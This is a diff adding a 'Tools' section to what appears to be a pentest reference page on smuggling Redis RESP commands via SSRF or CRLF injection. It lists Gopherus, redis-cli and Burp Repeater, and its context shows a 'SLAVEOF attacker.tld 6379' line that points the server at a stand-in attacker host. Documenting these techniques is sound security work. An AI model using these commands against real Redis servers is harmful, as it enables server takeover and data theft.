@@ -63,6 +63,12 @@ SLAVEOF attacker.tld 6379
 
 Each line is separated by `\r\n` on the wire. The `INFO` and `CONFIG GET dir` responses reveal the Redis version and the working directory that the [CONFIG SET abuse](config-set-abuse.md) chain depends on.
 
+## Tools
+
+- **redis-cli**: issue and verify the smuggled RESP commands against the server.
+- **Gopherus**: generate gopher:// RESP payloads for SSRF-smuggled command injection.
+- **Burp Repeater**: deliver CRLF-bearing input or the SSRF URL through the web request.
+
 ## References
 
 - [Redis: RESP protocol specification](https://redis.io/docs/latest/develop/reference/protocol-spec/)
